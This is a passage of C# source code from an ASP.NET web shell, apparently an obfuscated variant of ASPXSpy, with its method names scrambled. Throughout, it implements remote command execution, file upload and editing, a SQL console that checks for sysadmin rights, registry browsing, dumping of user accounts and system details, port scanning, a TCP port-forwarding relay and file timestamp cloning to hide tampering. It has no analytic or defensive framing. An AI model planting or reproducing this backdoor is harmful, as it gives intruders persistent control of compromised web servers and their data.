						td.Text="<font color=red>"+state+"</font>";
					}
					tr.Controls.Add(td);
				}
				if(i==6)
				{
					td.Text=dt.Rows[j]["StartMode"].ToString();
					tr.Controls.Add(td);
				}
			}
			Bin_Table_Serviecs.Controls.Add(tr);
		}
	}
	private void Bin_UserInfo()
	{
		DirectoryEntry users=new DirectoryEntry("WinNT://"+Environment.MachineName.ToString());
		foreach(DirectoryEntry child in users.Children)
		{
			foreach(string name in child.Properties.PropertyNames)
			{
				PropertyValueCollection pvc=child.Properties[name];
				int c=pvc.Count;
				for(int i=0;i<c;i++)
				{
					if(name!="objectSid"&&name!="Parameters"&&name!="LoginHours")
					{
						TableRow tr=efefskdKK();
						TableCell td=new TableCell();
						td.Text=name;
						tr.Controls.Add(td);
						TableCell td1=new TableCell();
						td1.Text=pvc[i].ToString();
						tr.Controls.Add(td1);
						Bin_Table_User.Controls.Add(tr);
					}
				}
			}
			TableRow trn=new TableRow();
			for(int x=1;x<3;x++)
			{
				TableCell tdn=new TableCell();
				tdn.Attributes["style"]="height:2px;background-color:#bbbbbb;";
				trn.Controls.Add(tdn);
				Bin_Table_User.Controls.Add(trn);
			}
		}
	}
	private void benssEEv()
	{
		DataTable user=zcg_WmiDataTable("root\\CIMV2","select * from Win32_UserAccount");
		for(int i=0;i<user.Rows.Count;i++)
		{
			for(int j=0;j<user.Columns.Count;j++)
			{
				TableRow tr=efefskdKK();
				TableCell td=new TableCell();
				td.Text=user.Columns[j].ToString();
				tr.Controls.Add(td);
				TableCell td1=new TableCell();
				td1.Text=user.Rows[i][j].ToString();
				tr.Controls.Add(td1);
				Bin_Table_User.Controls.Add(tr);
			}
			TableRow trn=new TableRow();
			for(int x=1;x<3;x++)
			{
				TableCell tdn=new TableCell();
				tdn.Attributes["style"]="height:2px;background-color:#bbbbbb;";
				trn.Controls.Add(tdn);
				Bin_Table_User.Controls.Add(trn);
			}
		}
	}
	private void benssyS()
	{
		Hide_Div();
		Bin_Div_Sysinfo.Visible=true;
		Bin_H2_Title.InnerText="System Information >>";
		Bin_H2_Mac.InnerText="MAC Information >>";
		Bin_H2_Driver.InnerText="Driver Information >>";
		StringBuilder s_inf=new StringBuilder();
		StringBuilder s_netconfig=new StringBuilder();
		StringBuilder s_driver=new StringBuilder();
		try
		{
			s_inf.Append("<li><u>Server Domain : </u>"+Request.ServerVariables["SERVER_NAME"]+"</li>");
			s_inf.Append("<li><u>Server Ip : </u>"+Request.ServerVariables["LOCAL_ADDR"]+":"+Request.ServerVariables["SERVER_PORT"]+"</li>");
			s_inf.Append("<li><u>Server OS : </u>"+Environment.OSVersion+"</li>");
			s_inf.Append("<li><u>Server Software : </u>"+Request.ServerVariables["SERVER_SOFTWARE"]+"</li>");
			s_inf.Append("<li><u>Server UserName : </u>"+zcg_GetUserName()+"</li>");
			s_inf.Append("<li><u>Server Time : </u>"+System.DateTime.Now.ToString()+"</li>");
			RegistryKey key_ts=Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp");
			string tsport=GetRegValue(key_ts,"PortNumber");
			RegistryKey key_cpu=Registry.LocalMachine.OpenSubKey(@"HARDWARE\DESCRIPTION\System\CentralProcessor");
			int cpu=key_cpu.SubKeyCount;
			RegistryKey key_cpuinfo=Registry.LocalMachine.OpenSubKey(@"HARDWARE\DESCRIPTION\System\CentralProcessor\0\");
			string cpuver=GetRegValue(key_cpuinfo,"ProcessorNameString");
			s_inf.Append("<li><u>Terminal Port : </u>"+tsport+"</li>");
			s_inf.Append("<li><u>CPU Count : </u>"+cpu.ToString()+"</li>");
			s_inf.Append("<li><u>CPU Version : </u>"+cpuver+"</li>");
			s_inf.Append("<li><u>Server TimeZone : </u>"+zcg_WmiDataTable("root\\CIMV2","select * from Win32_TimeZone").Rows[0]["Caption"]+"</li>");
			DataTable BIOS=zcg_WmiDataTable("root\\CIMV2","select * from Win32_BIOS");
			s_inf.Append("<li><u>Server BIOS : </u>"+BIOS.Rows[0]["Manufacturer"]+" : "+BIOS.Rows[0]["Name"]+"</li>");
			DataTable Memory=zcg_WmiDataTable("root\\CIMV2","select * from Win32_PhysicalMemory");
			Int64 Memoryall=0;
			for(int i=0;i<Memory.Rows.Count;i++)
			{
				Memoryall+=Int64.Parse(Memory.Rows[0]["Capacity"].ToString());
			}
			s_inf.Append("<li><u>Server Memory : </u>"+FleBnnSize(Memoryall)+"</li>");
			DataTable NetConfig=zcg_WmiDataTable("root\\CIMV2","select * from Win32_NetworkAdapterConfiguration");
			for(int i=0;i<NetConfig.Rows.Count;i++)
			{
				s_netconfig.Append("<li><u>Server MAC"+i+" : </u>"+NetConfig.Rows[i]["Caption"]+"</li>");
				if((NetConfig.Rows[i]["MACAddress"] as string)!="")
				{
					s_netconfig.Append("<li style=\"list-style:none;\"><u>Address : </u>"+NetConfig.Rows[i]["MACAddress"]+"</li>");
				}
			}
			DataTable Driver=zcg_WmiDataTable("root\\CIMV2","select * from Win32_SystemDriver");
			for (int i=0; i<Driver.Rows.Count; i++)
			{
				s_driver.Append("<li><u class='u1'>Server Driver"+i+" : </u><u class='u2'>"+Driver.Rows[i]["Caption"]+"</u> ");
				if ((Driver.Rows[i]["PathName"] as string)!="")
				{
					s_driver.Append("Path : "+Driver.Rows[i]["PathName"]);
				}
				else
				{
					s_driver.Append("No path information");
				}
				s_driver.Append("</li>");
			}
		}
		catch(Exception error)
		{
			ee_ShowErr(error);
		}
		finally
		{
			Bin_Ul_Sys.InnerHtml=s_inf.ToString();
			Bin_Ul_NetConfig.InnerHtml=s_netconfig.ToString();
			Bin_Ul_Driver.InnerHtml=s_driver.ToString();
		}
	}
	private void bnRgg()
	{
		RgHeaLL();
		rgInttt();
	}
	private void RgHeaLL()
	{
		Hide_Div();
		zemfosdfml.Visible=true;
		Bin_H2_Title.InnerText="RegShell >>";
		string RootKeys=@"HKEY_LOCAL_MACHINE|HKEY_CLASSES_ROOT|HKEY_CURRENT_USER|HKEY_USERS|HKEY_CURRENT_CONFIG";
		bnRggroot_Href.Text="";
		foreach(string rootkey in RootKeys.Split('|'))
		{
			bnRggroot_Href.Text+="<a href=\"javascript:Bin_PostBack('bnRggread','"+Bin_ToBase64(rootkey)+"')\">"+rootkey+"</a> | ";
		}
	}
	private void rgInttt()
	{
		Bin_Text_Regread.Text="";
		string RootKeys=@"HKEY_LOCAL_MACHINE|HKEY_CLASSES_ROOT|HKEY_CURRENT_USER|HKEY_USERS|HKEY_CURRENT_CONFIG";
		TableRow tr;
		TableCell tc;
		foreach(string rootkey in RootKeys.Split('|'))
		{
			tc=new TableCell();
			tr=efefskdKK();
			tc.Width=Unit.Parse("40%");
			tc.Text="<a href=\"javascript:Bin_PostBack('bnRggread','"+Bin_ToBase64(rootkey)+"')\">"+rootkey+"</a>";
			tr.Cells.Add(tc);
			tc=new TableCell();
			tc.Width=Unit.Parse("60%");
			tc.Text="&lt;RootKey&gt;";
			tr.Cells.Add(tc);
			Bin_Table_Reg.Rows.Add(tr);
		}
	}
	private void Bin_ShowReg(string Reg_Path)
	{
		RgHeaLL();
		if(!Reg_Path.EndsWith("\\"))
		{
			Reg_Path=Reg_Path+"\\";
		}
		Bin_Text_Regread.Text=Reg_Path;
		string ParPath=Regex.Replace(Reg_Path,@"\\[^\\]+\\?$","");
		ParPath=Regex.Replace(ParPath,@"\\+","\\");
		TableRow tr=efefskdKK();
		TableCell tc=new TableCell();
		tc.Text="<a href=\"javascript:Bin_PostBack('bnRggread','"+Bin_ToBase64(ParPath)+"')\">Parent Key</a>";
		tc.Attributes["colspan"]="2" ;
		tr.Cells.Add(tc);
		Bin_Table_Reg.Rows.Add(tr);
		try
		{
			string strSubkey=Reg_Path.Substring(Reg_Path.IndexOf("\\")+1,Reg_Path.Length-Reg_Path.IndexOf("\\")-1);
			RegistryKey rk=null;
			RegistryKey sk;
			if(Reg_Path.StartsWith("HKEY_LOCAL_MACHINE",true,null)||Reg_Path.StartsWith("hklm",true,null))
			{
				rk=Registry.LocalMachine;
			}
			else if(Reg_Path.StartsWith("HKEY_CLASSES_ROOT",true,null)||Reg_Path.StartsWith("hkcr",true,null))
			{
				rk=Registry.ClassesRoot;
			}
			else if(Reg_Path.StartsWith("HKEY_CURRENT_USER",true,null)||Reg_Path.StartsWith("hkcu",true,null))
			{
				rk=Registry.CurrentUser;
			}
			else if(Reg_Path.StartsWith("HKEY_USERS",true,null)||Reg_Path.StartsWith("hku",true,null))
			{
				rk=Registry.Users;
			}
			else if(Reg_Path.StartsWith("HKEY_CURRENT_CONFIG",true,null)||Reg_Path.StartsWith("hkcc",true,null))
			{
				rk=Registry.CurrentConfig;
			}
			if(strSubkey.Length>1)
			{
				sk=rk.OpenSubKey(strSubkey);
			}
			else
			{
				sk=rk;
			}
			foreach(string innerSubKey in sk.GetSubKeyNames())
			{
				tr=efefskdKK();
				tc=new TableCell();
				tc.Width=Unit.Parse("40%");
				tc.Text="<a href=\"javascript:Bin_PostBack('bnRggread','"+Bin_ToBase64(Reg_Path+innerSubKey)+"')\">"+innerSubKey+"</a>";
				tr.Cells.Add(tc);
				tc=new TableCell();
				tc.Width=Unit.Parse("60%");
				tc.Text="&lt;SubKey&gt;";
				tr.Cells.Add(tc);
				Bin_Table_Reg.Rows.Add(tr);
			}
			TableRow intr=new TableRow();
			intr.Attributes["style"]="border-top:1px solid #fff;border-bottom:1px solid #ddd;";
			intr.Attributes["bgcolor"]="#dddddd";
			TableCell intc=new TableCell();
			intc.Attributes["colspan"]="2" ;
			intc.Attributes["height"]="5";
			intr.Cells.Add(intc);
			Bin_Table_Reg.Rows.Add(intr);
			foreach(string strValueName in sk.GetValueNames())
			{
				tr=efefskdKK();
				tc=new TableCell();
				tc.Width=Unit.Parse("40%");
				tc.Text=strValueName;
				tr.Cells.Add(tc);
				tc=new TableCell();
				tc.Width=Unit.Parse("60%");
				tc.Text=GetRegValue(sk,strValueName);
				tr.Cells.Add(tc);
				Bin_Table_Reg.Rows.Add(tr);
			}
		}
		catch(NullReferenceException ex){bnMsgg("Path not found");}
		catch(Exception ex){ee_ShowErr(ex);}
	}
	private string GetRegValue(RegistryKey sk,string strValueName)
	{
		object buffer;
		string regstr="";
		try
		{
			buffer=sk.GetValue(strValueName,"NULL");
			if(buffer.GetType()==typeof(byte[]))
			{
				foreach(byte tmpbyte in(byte[])buffer)
				{
					if((int)tmpbyte<16)
					{
						regstr+="0";
					}
					regstr+=tmpbyte.ToString("X");
				}
			}
			else if(buffer.GetType()==typeof(string[]))
			{
				foreach(string tmpstr in(string[])buffer)
				{
					regstr+=tmpstr;
				}
			}
			else
			{
				regstr=buffer.ToString();
			}
		}
		catch(Exception error)
		{
			ee_ShowErr(error);
		}
		return regstr;
	}
	private void ehPrtOO()
	{
		Hide_Div();
		zemfokeUQ.Visible=true;
		Bin_H2_Title.InnerText="PortScan >>";
	}
	private void euDBee()
	{
		Hide_Div();
		Bin_Div_Data.Visible=true;
		Bin_Div_DBPanel.Visible=false;
		Bin_H2_Title.InnerText="DataBase >>";
	}
	private void OpenConnection()
	{
		if(IsSqlServer())
		{
			conn=new SqlConnection();
			comm=new SqlCommand();
		}else{
		conn=new OleDbConnection();
		comm=new OleDbCommand();
		}
		if(conn.State==ConnectionState.Closed)
		{
			try
			{
				conn.ConnectionString=Bin_TextBox_ConnStr.Text;
				comm.Connection=conn;
				conn.Open();
				if(IsSqlServer()&&Bin_List_DB.SelectedItem!=null&&Bin_List_DB.SelectedItem.Value!="")
				{
					conn.ChangeDatabase(Bin_List_DB.SelectedItem.Value.ToString());
				}
			}
			catch(Exception error)
			{
				ee_ShowErr(error);
			}
		}
	}
	private void CloseConnection()
	{
		if(conn.State==ConnectionState.Open)
		{
			conn.Close();
		}
		conn.Dispose();
		comm.Dispose();
	}
	private bool IsSqlServer()
	{
		return Bin_List_Connstr.SelectedItem.Text=="MSSQL";
	}
	private DataTable Bin_DataTable(string sqlstr)
	{
		DbDataAdapter da=null;
		if(IsSqlServer())
		{
			da=new SqlDataAdapter();
		}else{
			da=new OleDbDataAdapter();
		}
		DataTable dtable=new DataTable();
		try
		{
			OpenConnection();
			comm.CommandType=CommandType.Text;
			comm.CommandText=sqlstr;
			da.SelectCommand=comm;
			da.Fill(dtable);
		}
		finally
		{
			CloseConnection();
		}
		return dtable;
	}
	private bool eNExQsl(string instr)
	{
		try
		{
			OpenConnection();
			comm.CommandType=CommandType.Text;
			comm.CommandText=instr;
			comm.ExecuteNonQuery();
			return true;
		}
		catch(Exception e)
		{
			ee_ShowErr(e);
			return false;
		}
	}
	private void eNExcBnd()
	{
		try
		{
			DataTable dt=Bin_DataTable(Bin_Textarea_Query.InnerText);
			if(dt.Columns.Count>0)
			{
				zemfokemMdfe.PreRender+=new EventHandler(DataGrid_PreRender);
				zemfokemMdfe.DataSource=dt;
				zemfokemMdfe.DataBind();
				for(int i=0;i<zemfokemMdfe.Items.Count;i++)
				{
					fdsCtrll(zemfokemMdfe.Items[i]);
				}
			}
			else
			{
				zemfokemMdfe.DataSource=null;
				zemfokemMdfe.DataBind();
			}
			zemfokemMdfe.Visible=true;
		}
		catch(Exception e)
		{
			ee_ShowErr(e);
			zemfokemMdfe.Visible=false;
		}
	}
	private void Bin_DataBind()
	{
		try
		{
			if(IsSqlServer()&&Bin_List_DB.SelectedItem.Value=="")
			{
				zemfokemMdfe.DataSource=null;
				zemfokemMdfe.DataBind();
				return;
			}
			OpenConnection();
			DataTable tables=new DataTable();
			if(IsSqlServer()&&Bin_List_DB.SelectedItem.Value!="")
			{
				conn.ChangeDatabase(Bin_List_DB.SelectedItem.Text);
			}
			tables=conn.GetSchema("Tables");
			tables.Columns.Remove("TABLE_CATALOG");
			tables.Columns.Remove("TABLE_SCHEMA");
			if(!IsSqlServer()){tables.Columns.Remove("DESCRIPTION");tables.Columns.Remove("TABLE_PROPID");}
			zemfokemMdfe.PreRender+=new EventHandler(DataGrid_PreRender);
			zemfokemMdfe.DataSource=tables;
			zemfokemMdfe.DataBind();
			for(int i=0;i<zemfokemMdfe.Items.Count;i++)
			{
				string tname=zemfokemMdfe.Items[i].Cells[0].Text;
				fdsCtrll(zemfokemMdfe.Items[i]);
				zemfokemMdfe.Items[i].Attributes["onclick"]="ASPXSpy.Bin_Textarea_Query.value='select * from " + tname + "';";
			}
			zemfokemMdfe.Visible=true;
		}
		catch(Exception e)
		{
			ee_ShowErr(e);
			zemfokemMdfe.Visible=false;
		}
	}
	protected void DataGrid_PreRender(object sender,EventArgs e)
	{
		DataGrid d=(DataGrid)sender;
		foreach(DataGridItem item in d.Items)
		{
			foreach(TableCell t in item.Cells)
			{
				t.Text=t.Text.Replace("<","&lt;").Replace(">","&gt;");
			}
		}
	}
	private void feeConss()
	{
		Bin_Div_DBPanel.Visible=true;
		try
		{
			Bin_Textarea_Query.InnerHtml="";
			if(Bin_List_Connstr.SelectedItem.Text=="MSSQL")
			{
				zemfokemMdfe.Visible=false;
				Bin_Div_Dblist.Visible=true;
				Bin_Div_Dbinfo.Visible=true;
				OpenConnection();
				string cdb=conn.Database;
				string verstr=Bin_DataTable(@"SELECT @@VERSION").Rows[0][0].ToString();
				DataTable dbs=Bin_DataTable(@"SELECT name FROM master..sysdatabases");
				DataTable rol=Bin_DataTable(@"SELECT IS_SRVROLEMEMBER('sysadmin')");
				DataTable owner=Bin_DataTable(@"SELECT IS_MEMBER('db_owner')");
				string dbo="";
				if(owner.Rows[0][0].ToString()=="1")
				{
					dbo="db_owner";
				}
				else
				{
					dbo="public";
				}
				if(rol.Rows[0][0].ToString()=="1")
				{
					dbo="<font color=blue>sa</font>";
				}
				Bin_List_Exec.SelectedIndex=0;
				Bin_List_DB.Items.Clear();
				for(int i=0;i<dbs.Rows.Count;i++)
				{
					Bin_List_DB.Items.Add(dbs.Rows[i][0].ToString());
					if (cdb==dbs.Rows[i][0].ToString())
					{
						Bin_List_DB.Items[i].Selected=true;
					}
				}
				Bin_Div_Dbinfo.InnerHtml="<p><font color=red>MSSQL Version</font> : <i><b>"+verstr+"</b></i></p><p><font color=red>SrvRoleMember</font> : <i><b>"+dbo+"</b></i></p>";							
			}
			else
			{
				Bin_Div_Dblist.Visible=false;
				Bin_Div_Dbinfo.Visible=false;
			}
			Bin_DataBind();
		}
		catch(Exception e)
		{
			ee_ShowErr(e);
			Bin_Div_DBPanel.Visible=false;
		}
	}
	private void BENppmm()
	{
		Hide_Div();
		zemfokemM.Visible=true;
		Bin_H2_Title.InnerText="PortMap >>";
	}
    private void KEjfsjJ()
    {
        Hide_Div();
        Bin_Div_WmiTools.Visible = true;
        Bin_Div_WmiPanel.Visible = false;
        Bin_H2_Title.InnerText = "WmiTools >>";        
    }
        
	internal class PrtFeedd
	{
		public string LocalAddress;
		public int LocalPort;
		public string RemoteAddress;
		public int RemotePort;
		private Socket ltcpClient;
		private Socket rtcpClient;
		private byte[] rbuffer=new byte[2048];
		private byte[] lbuffer=new byte[2048];
		internal struct session
		{
			public Socket rdel;
			public Socket ldel;
		}
		public bool IsConnected{get{return ltcpClient.Connected&&rtcpClient.Connected;}}
		private IPEndPoint GetIPEndPoint(string host,int port)
		{
			try{
			IPEndPoint iep=null;
			IPAddress ipAddress=Dns.Resolve(host).AddressList[0];
			iep=new IPEndPoint(ipAddress,port);
			return iep;}catch{throw new Exception("Host not found.");}
		}
		public void Start(string Rip,int Rport,string lip,int lport)
		{
			LocalPort=lport;
			RemoteAddress=Rip;
			RemotePort=Rport;
			LocalAddress=lip;
			new SocketPermission(NetworkAccess.Connect,TransportType.Tcp,Rip,Rport).Demand();
			new SocketPermission(NetworkAccess.Connect,TransportType.Tcp,lip,lport).Demand();
			rtcpClient=new Socket(AddressFamily.InterNetwork,SocketType.Stream,ProtocolType.Tcp);
			ltcpClient=new Socket(AddressFamily.InterNetwork,SocketType.Stream,ProtocolType.Tcp);
			rtcpClient.BeginConnect(Rip,Rport,new AsyncCallback(efuCosse),rtcpClient);
		}
		protected void efuCosse(IAsyncResult ar)
		{
			try
			{
				session mysession=new session();
				mysession.ldel=ltcpClient;
				mysession.rdel=rtcpClient;
				ltcpClient.BeginConnect(LocalAddress,LocalPort,new AsyncCallback(klazzavanToi),mysession);
			}catch{ }
		}
		protected void klazzavanToi(IAsyncResult ar)
		{
			try
			{
				session mysession=(session)ar.AsyncState;
				ltcpClient.EndConnect(ar);
				mysession.rdel.BeginReceive(rbuffer,0,rbuffer.Length,SocketFlags.None,new AsyncCallback(monCuZZ),mysession);
				mysession.ldel.BeginReceive(lbuffer,0,lbuffer.Length,SocketFlags.None,new AsyncCallback(aLLlezon),mysession);
			}catch{ }
		}
		protected void monCuZZ(IAsyncResult ar)
		{
			try
			{
				session mysession=(session)ar.AsyncState;
				int Ret=mysession.rdel.EndReceive(ar);
				if (Ret>0)
					ltcpClient.BeginSend(rbuffer,0,Ret,SocketFlags.None,new AsyncCallback(EUhAlle),mysession);
				else Stop();
			}catch{ }
		}
		protected void EUhAlle(IAsyncResult ar)
		{
			try
			{
				session mysession=(session)ar.AsyncState;
				mysession.ldel.EndSend(ar);
				mysession.rdel.BeginReceive(rbuffer,0,rbuffer.Length,SocketFlags.None,new AsyncCallback(this.monCuZZ),mysession);
			}catch{ }
		}
		protected void aLLlezon(IAsyncResult ar)
		{
			try
			{
				session mysession=(session)ar.AsyncState;
				int Ret=mysession.ldel.EndReceive(ar);

				if (Ret>0)
					mysession.rdel.BeginSend(lbuffer,0,Ret,SocketFlags.None,new AsyncCallback(onrsend),mysession);
				else Stop();
			}catch{ }
		}
		protected void onrsend(IAsyncResult ar)
		{
			try
			{

				session mysession=(session)ar.AsyncState;
				mysession.rdel.EndSend(ar);
				mysession.ldel.BeginReceive(lbuffer,0,lbuffer.Length,SocketFlags.None,new AsyncCallback(this.aLLlezon),mysession);
			}catch{ }
		}
		public void Stop()
		{
			try
			{
				if (ltcpClient!=null)
				{
					ltcpClient.Close();
				}
				if (rtcpClient!=null)
					rtcpClient.Close();
			}
			catch{ }
		}
	}
	internal class ScnpRt
	{
		public string ip="";
		public int port=0;
		public string status="Pas Scannerr";
		public ScnpRt(string ip,int port)
		{
			this.ip=ip;
			this.port=port;
		}
		public void Scan()
		{
			TcpClient tc=new TcpClient();
			try
			{
				tc.Connect(ip,port);
				tc.Close();
				status="<font color=green><b>Open</b></font>";
			}
			catch
			{
				status="<font color=red><b>Close</b></font>";
			}
		}
	}
	public static void JscriptSender(System.Web.UI.Page page)
	{
		page.RegisterHiddenField("__EVENTTARGET","");
		page.RegisterHiddenField("__FILE","");
		string s=@"<script language=Javascript>";
		s+=@"function Bin_PostBack(eventTarget,eventArgument)";
		s+=@"{";
		s+=@"var theform=document.forms[0];";
		s+=@"theform.__EVENTTARGET.value=eventTarget;";
		s+=@"theform.__FILE.value=eventArgument;";
		s+=@"theform.submit();theform.__EVENTTARGET.value="""";theform.__FILE.value=""""";
		s+=@"} ";
		s+=@"</scr"+"ipt>";
		page.RegisterStartupScript("",s);
	}
	protected void lfdseIIej(object sender,EventArgs e)
	{
		Hide_Div();
		Bin_Div_Search.Visible=true;
		Bin_H2_Title.InnerText="File Search >>";
		Bin_Search_Path.Value=Request.PhysicalApplicationPath;
		eBinezlwqKV.Visible=false;
	}
	protected void lefidUU(object sender,EventArgs e)
	{
		try{
		DirectoryInfo Bin_dir=new DirectoryInfo(Bin_Search_Path.Value);
		if(!Bin_dir.Exists)
		{
			bnMsgg("Path invalid ! ");
			return;
		}
		aeifDD(Bin_dir);
		bnMsgg("Search completed ! ");}catch(Exception ex){ee_ShowErr(ex);}
	}
	private void aeifDD(DirectoryInfo dir)
	{
		try
		{
			eBinezlwqKV.Visible=true;
			foreach(FileInfo FleBnns in dir.GetFiles())
			{
				try
				{
					if(!Regex.IsMatch(FleBnns.Extension.Replace(".",""),"^("+bnTESSteff.Value+")$",RegexOptions.IgnoreCase))
					{
						continue;
					}
					if(Bin_Search_Mod.SelectedItem.Value=="name")
					{
						if(esRcezlwo.Checked)
						{
							if(Regex.IsMatch(FleBnns.Name,bnTESStSe.Value,RegexOptions.IgnoreCase))
							{
								fdskekFF(FleBnns);
							}
						}
						else
						{
							if(FleBnns.Name.ToLower().IndexOf(bnTESStSe.Value.ToLower())!=-1)
							{
								fdskekFF(FleBnns);
							}
						}
					}
					else
					{
						StreamReader sr=new StreamReader(FleBnns.FullName,Encoding.Default);
						string filecontent=sr.ReadToEnd();
						sr.Close();
						if(esRcezlwo.Checked)
						{
							if(Regex.IsMatch(filecontent,bnTESStSe.Value,RegexOptions.IgnoreCase))
							{
								fdskekFF(FleBnns);
								if(esRcezlwqK.Checked)
								{
									filecontent=Regex.Replace(filecontent,bnTESStSe.Value,Bin_TextArea_ReplaceAs.Value,RegexOptions.IgnoreCase);
									StreamWriter sw=new StreamWriter(FleBnns.FullName,false,Encoding.Default);
									sw.Write(filecontent);
									sw.Close();
								}
							}
						}
						else
						{
							if(filecontent.ToLower().IndexOf(bnTESStSe.Value.ToLower())!=-1)
							{
								fdskekFF(FleBnns);
								if(esRcezlwqK.Checked)
								{
									filecontent=filecontent.Replace(bnTESStSe.Value,Bin_TextArea_ReplaceAs.Value);
									StreamWriter sw=new StreamWriter(FleBnns.FullName,false,Encoding.Default);
									sw.Write(filecontent);
									sw.Close();
								}
							}
						}
					}
				}
				catch(Exception ex)
				{
					ee_ShowErr(ex);
					continue;
				}
			}
			foreach(DirectoryInfo subdir in dir.GetDirectories())
			{
				aeifDD(subdir);
			}
		}
		catch(Exception ex)
		{
			ee_ShowErr(ex);
		}
	}
	private void fdskekFF(FileInfo objfile)
	{
		TableRow tr=efefskdKK();
		TableCell tc=new TableCell();
		tc.Text="<a href=\"javascript:Bin_PostBack('bonDEK','"+Bin_ToBase64(objfile.FullName)+"')\">"+objfile.FullName+"</a>";
		tr.Cells.Add(tc);
		tc=new TableCell();
		tc.Text=objfile.LastWriteTime.ToString();
		tr.Cells.Add(tc);
		tc=new TableCell();
		tc.Text=FleBnnSize(objfile.Length);
		tr.Cells.Add(tc);
		eBinezlwqKV.Rows.Add(tr);
	}
	private void bnMsgg(string instr)
	{
		Bin_Div_Msg.Visible=true;
		Bin_Div_Msg.InnerHtml="<pre><xmp>"+instr+"</xmp></pre>";
	}
	private void ee_ShowErr(Exception ex)
	{
		if(ex.InnerException==null){bnMsgg(ex.Message);}else{bnMsgg(ex.ToString());}
	}
	protected void Bin_Button_Login_Click(object sender,EventArgs e)
	{
		string MD5Pass=FormsAuthentication.HashPasswordForStoringInConfigFile(Bin_TextBox_Login.Text,"MD5").ToLower();
		if(MD5Pass==Password)
		{
			Response.Cookies.Add(new HttpCookie(Version,Password));
			Bin_Div_Login.Visible=false;
			Bin_Main();
		}
		else
		{
			BEINLOG();
		}
	}
	protected void Bin_Button_File_Click(object sender,EventArgs e)
	{
		FleBnn(Server.MapPath("."));
	}
	protected void btnspuclkCk(object sender,EventArgs e)
	{
		Bin_H2_Title.InnerText="IIS Spyy >>";
		Hide_Div();
		Bin_Div_IISSpy.Visible=true;
		ETable_Sp.Style.Add("word-break","break-all");
		try{klaseee();}catch{try{bnSpEE();}catch(Exception ex){ee_ShowErr(ex);}}
	}
	protected void Bin_Button_Save_Click(object sender,EventArgs e)
	{
		try
		{
			StreamWriter sw;
			if(Bin_List_Code.SelectedItem.Text=="UTF-8")
			{
				sw=new StreamWriter(Bin_TextBox_Fp.Value,false,Encoding.UTF8);
			}
			else
			{
				sw=new StreamWriter(Bin_TextBox_Fp.Value,false,Encoding.Default);
			}
			sw.Write(Bin_Textarea_Edit.InnerText);
			sw.Close();
			bnMsgg("Save file success !");
		}
		catch(Exception error)
		{
			ee_ShowErr(error);
		}
		FleBnn(Bin_TextBox_Path.Value);
	}
	protected void lefkdUpefds(object sender,EventArgs e)
	{
		string uppath=Bin_TextBox_Path.Value;
		uppath=bnPthBuild(uppath);
		try
		{
			if(Bin_Lable_File.PostedFile.FileName==""){bnMsgg("No file to up");}
			else{Bin_Lable_File.PostedFile.SaveAs(uppath+Path.GetFileName(Bin_Lable_File.Value));bnMsgg("File upload succes");}
		}
		catch(Exception error)
		{
			ee_ShowErr(error);
		}
		FleBnn(Bin_TextBox_Path.Value);
	}
	protected void dskeuII(object sender,EventArgs e)
	{
		FleBnn(Bin_TextBox_Path.Value);
	}
	protected void keffdsdEEER(object sender,EventArgs e)
	{
		FleBnn(Server.MapPath("."));
	}
	protected void onyetlD(object sender,EventArgs e)
	{
		try
		{
			File.SetCreationTimeUtc(Bin_TextBox_Sp.Value,File.GetCreationTimeUtc(Bin_TextBox_Dp.Value));
			File.SetLastAccessTimeUtc(Bin_TextBox_Sp.Value,File.GetLastAccessTimeUtc(Bin_TextBox_Dp.Value));
			File.SetLastWriteTimeUtc(Bin_TextBox_Sp.Value,File.GetLastWriteTimeUtc(Bin_TextBox_Dp.Value));
			bnMsgg("File time clone success!");
		}
		catch(Exception error)
		{
			ee_ShowErr(error);
		}
		FleBnn(Bin_TextBox_Path.Value);
	}
	protected void dfskeiUZ(object sender,EventArgs e)
	{
		string path=Bin_TextBox_Sp1.Value;
		try
		{
			File.SetAttributes(path,FileAttributes.Normal);
			if(Bin_CheckBox_ReadOnly.Checked)
			{
				File.SetAttributes(path,FileAttributes.ReadOnly);
			}
			if(Bin_CheckBox_System.Checked)
			{
				File.SetAttributes(path,File.GetAttributes(path)| FileAttributes.System);
			}
			if(Bin_CheckBox_Hiddent.Checked)
			{
				File.SetAttributes(path,File.GetAttributes(path)| FileAttributes.Hidden);
			}
			if(Bin_CheckBox_Archive.Checked)
			{
				File.SetAttributes(path,File.GetAttributes(path)| FileAttributes.Archive);
			}
			File.SetCreationTimeUtc(path,Convert.ToDateTime(Bin_TextBox_Creation.Value));
			File.SetLastAccessTimeUtc(path,Convert.ToDateTime(Bin_TextBox_LastAccess.Value));
			File.SetLastWriteTimeUtc(path,Convert.ToDateTime(Bin_TextBox_LastWrite.Value));
			bnMsgg("File attributes modify success!");
		}
		catch(Exception error)
		{
			ee_ShowErr(error);
		}
		FleBnn(Bin_TextBox_Path.Value);
	}
	protected void btUndfCsse(object sender,EventArgs e)
	{
		Hide_Div();
		Bin_Div_Cmd.Visible=true;
		Bin_H2_Title.InnerText="Execute Command >>";
	}
	protected void btnEdoCik(object sender,EventArgs e)
	{
		try{excedD();}
		catch(Exception ex){ee_ShowErr(ex);}
	}
	private void excedD()
	{
		try
		{
			Process Cmdpro=new Process();
			Cmdpro.StartInfo.FileName=Bin_TextBox_CmdPath.Value;
			Cmdpro.StartInfo.Arguments=Bin_TextBox_CmdArg.Value;
			Cmdpro.StartInfo.UseShellExecute=false;
			Cmdpro.StartInfo.RedirectStandardInput=true;
			Cmdpro.StartInfo.RedirectStandardOutput=true;
			Cmdpro.StartInfo.RedirectStandardError=true;
			Cmdpro.Start();
			string cmdstr=Cmdpro.StandardOutput.ReadToEnd();
            cmdstr+=Cmdpro.StandardError.ReadToEnd();
			Bin_Div_CmdRes.Visible=true;
			Bin_Div_CmdRes.InnerHtml="<hr width=\"100%\" noshade/><pre><xmp>"+cmdstr+"</xmp></pre>";
		}
		catch(Exception error)
		{
			ee_ShowErr(error);
		}
	}
	protected void lekfdnKKEZSA(object sender,EventArgs e)
	{
		if(Bin_Text_Regread.Text.Length>0)
		{
			Bin_ShowReg(Bin_Text_Regread.Text);
		}
		else
		{
			rgInttt();
		}
	}
	protected void bonebfujkkK(object sender,EventArgs e)
	{
		outsalaE();
		try{KiProccsse();}catch{try{GtProcss();}catch(Exception ex){ee_ShowErr(ex);}}
	}
	private void outsalaE()
	{
		Bin_H2_Title.InnerText="Process >>";
		Hide_Div();
		Bin_Div_Process.Visible=true;
	}
